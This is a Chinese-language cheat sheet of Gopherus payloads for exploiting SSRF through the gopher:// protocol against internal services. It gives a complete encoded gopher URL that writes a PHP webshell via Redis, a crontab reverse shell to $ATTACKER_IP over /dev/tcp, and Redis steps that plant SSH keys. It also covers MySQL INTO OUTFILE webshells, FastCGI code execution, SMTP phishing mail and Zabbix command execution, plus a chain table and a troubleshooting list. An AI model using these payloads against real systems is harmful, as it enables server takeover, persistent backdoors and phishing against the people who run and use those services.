# Gopherus Gopher 协议 Payload 参考

## gopher:// URL 编码规则

- `\r\n` → `%0d%0a`
- payload 需双重 URL 编码（浏览器/curl 解码一层，gopher 协议解码一层）
- URL 格式：`gopher://$TARGET_IP:$PORT/_{payload}`
- `/_` 中的 `_` 是 gopher 协议的 type indicator，实际不发送，后面才是真正 payload

**双重编码示例：**

```
原始:    *1\r\n$4\r\nINFO\r\n
一次编码: *1%0d%0a$4%0d%0aINFO%0d%0a
二次编码: *1%250d%250a%244%250d%250aINFO%250d%250a
```

---

## Redis（最常见）

```bash
gopherus --exploit redis
```

### 写 Webshell

通过 CONFIG SET 修改 dir/dbfilename，再 SET payload 写入文件：

```
gopher://127.0.0.1:6379/_*1%0D%0A$8%0D%0Aflushall%0D%0A*3%0D%0A$3%0D%0ASET%0D%0A$1%0D%0A1%0D%0A$28%0D%0A%0A%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%3F%3E%0A%0D%0A*4%0D%0A$6%0D%0ACONFIG%0D%0A$3%0D%0ASET%0D%0A$3%0D%0Adir%0D%0A$13%0D%0A/var/www/html%0D%0A*4%0D%0A$6%0D%0ACONFIG%0D%0A$3%0D%0ASET%0D%0A$10%0D%0Adbfilename%0D%0A$9%0D%0Ashell.php%0D%0A*1%0D%0A$4%0D%0ASAVE%0D%0A
```

### 写 Crontab 反弹 Shell

```
*/1 * * * * bash -i >& /dev/tcp/$ATTACKER_IP/$PORT 0>&1
```

Redis 命令序列：

```
FLUSHALL
SET 1 "\n\n*/1 * * * * bash -i >& /dev/tcp/$ATTACKER_IP/$PORT 0>&1\n\n"
CONFIG SET dir /var/spool/cron/
CONFIG SET dbfilename root
SAVE
```

### 写 SSH authorized_keys

```
FLUSHALL
SET 1 "\n\n$SSH_PUBLIC_KEY\n\n"
CONFIG SET dir /root/.ssh/
CONFIG SET dbfilename authorized_keys
SAVE
```

### 手工 RESP 协议构造

RESP 协议格式：`*参数数量\r\n$字节长度\r\n参数值\r\n`

```
*1\r\n$8\r\nflushall\r\n
*3\r\n$3\r\nSET\r\n$1\r\n1\r\n$PAYLOAD_LEN\r\n$PAYLOAD\r\n
*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$3\r\ndir\r\n$DIR_LEN\r\n$DIR_PATH\r\n
*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$10\r\ndbfilename\r\n$FILENAME_LEN\r\n$FILENAME\r\n
*1\r\n$4\r\nSAVE\r\n
```

**Python 辅助生成脚本：**

```python
import urllib.parse

def gen_redis_gopher(cmds):
    payload = ""
    for cmd in cmds:
        parts = cmd.split(" ")
        payload += f"*{len(parts)}\r\n"
        for p in parts:
            payload += f"${len(p)}\r\n{p}\r\n"
    return "gopher://127.0.0.1:6379/_" + urllib.parse.quote(payload)
```

---

## MySQL

```bash
gopherus --exploit mysql
```

- 利用无密码认证发送 SQL payload
- 典型 payload：`SELECT "<?php system($_GET['cmd']);?>" INTO OUTFILE '/var/www/html/shell.php'`

**前置条件：**
- MySQL 允许无密码本地登录（空密码 root）
- `--skip-grant-tables` 或弱配置
- `secure_file_priv` 未限制或为空

**原理：** 构造 MySQL 客户端认证握手包 + COM_QUERY 包，通过 gopher 发送到 3306 端口

---

## FastCGI

```bash
gopherus --exploit fastcgi
```

- 通过修改 `PHP_VALUE` 注入 `auto_prepend_file` 实现 PHP 代码执行
- 可绕过 `disable_functions` 和 `open_basedir`（通过 PHP_ADMIN_VALUE）

**前置条件：**
- PHP-FPM 监听 TCP 端口（默认 9000）或 Unix socket
- 已知服务器上一个 .php 文件的绝对路径（如 `/var/www/html/index.php`）

**典型 FastCGI 参数：**

```
SCRIPT_FILENAME: /var/www/html/index.php
PHP_VALUE: auto_prepend_file = php://input
```

---

## PostgreSQL

```bash
gopherus --exploit postgresql
```

- 构造 PostgreSQL 协议包执行 SQL
- 可用于写文件（`COPY ... TO`）或命令执行（`CREATE EXTENSION`）

**前置条件：**
- PostgreSQL 信任本地连接（`pg_hba.conf` 中 trust 认证）
- 默认端口 5432

---

## SMTP

```bash
gopherus --exploit smtp
```

- 构造 SMTP 协议命令发送邮件
- 可用于钓鱼邮件发送（社工联动）

**SMTP 命令序列：**

```
HELO $HOSTNAME\r\n
MAIL FROM:<$FROM_ADDR>\r\n
RCPT TO:<$TO_ADDR>\r\n
DATA\r\n
Subject: $SUBJECT\r\n
\r\n
$BODY\r\n
.\r\n
QUIT\r\n
```

---

## Zabbix

```bash
gopherus --exploit zabbix
```

- 构造 Zabbix Agent 协议包执行 `system.run` 命令
- 默认端口 10050

**前置条件：**
- Zabbix Agent 未限制来源 IP（`Server=` 配置宽泛）
- `EnableRemoteCommands=1`

---

## 实战组合链

| 攻击链 | 目标端口 | 效果 |
|--------|---------|------|
| SSRF → gopher://127.0.0.1:6379 → Redis 写 crontab | 6379 | 反弹 Shell |
| SSRF → gopher://127.0.0.1:6379 → Redis 写 webshell | 6379 | Web 后门 |
| SSRF → gopher://127.0.0.1:6379 → Redis 写 SSH key | 6379 | SSH 登录 |
| SSRF → gopher://127.0.0.1:9000 → FastCGI | 9000 | PHP 代码执行 |
| SSRF → gopher://127.0.0.1:3306 → MySQL | 3306 | UDF/写文件 |
| SSRF → gopher://127.0.0.1:5432 → PostgreSQL | 5432 | SQL 执行/写文件 |
| SSRF → gopher://127.0.0.1:25 → SMTP | 25 | 钓鱼邮件 |
| SSRF → gopher://127.0.0.1:10050 → Zabbix | 10050 | 命令执行 |

---

## 排错检查清单

- gopher 不通？检查库是否支持（仅 PHP curl / libcurl 可靠支持）
- Redis 写文件失败？检查目标目录权限、Redis 是否以 root 运行
- MySQL payload 无效？确认目标确实允许空密码登录
- FastCGI 执行失败？确认 PHP-FPM 端口、已知 .php 文件路径
- 双重编码问题？用 `curl -v` 调试确认实际发送的字节
